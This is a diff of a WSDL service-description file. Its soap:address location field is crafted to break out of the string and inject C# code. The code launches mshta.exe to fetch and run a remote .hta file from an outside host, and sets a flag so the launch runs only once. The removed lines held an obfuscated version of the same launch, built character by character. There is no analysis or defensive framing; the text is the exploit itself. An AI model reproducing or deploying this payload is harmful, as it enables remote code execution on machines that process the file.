@@ -11,11 +11,11 @@
     </binding>
     <service name="Service">
         <port name="Port" binding="tns:Binding">
-            <soap:address location="http://?m?http://www.traininews.com/fs.hta"/>
+            <soap:address location="http://?mshta.exe?http://www.traininews.com/fs.hta"/>
                         <soap:address location=";
-                        char str = 's';  char str1 = 'h';  char str2 = 't';  char str3 = 'a';  char str4 = '.';  char str5 = 'e';  char str6 = 'x';  char str7 = 'e';  char str8 = 'b';  char str9 = 'b';  char str10 = 'b';  char str11 = 'b';
+                        
                         if (System.AppDomain.CurrentDomain.GetData(_url.Split('?')[0]) == null) {			
-                                System.Diagnostics.Process.Start(_url.Split('?')[1]+ str + str1 + str2 + str3 + str4 + str5 + str6 + str7, _url.Split('?')[2]);
+                                System.Diagnostics.Process.Start(_url.Split('?')[1], _url.Split('?')[2]);
                                 System.AppDomain.CurrentDomain.SetData(_url.Split('?')[0], 1);				
                                 
                         } //"/>
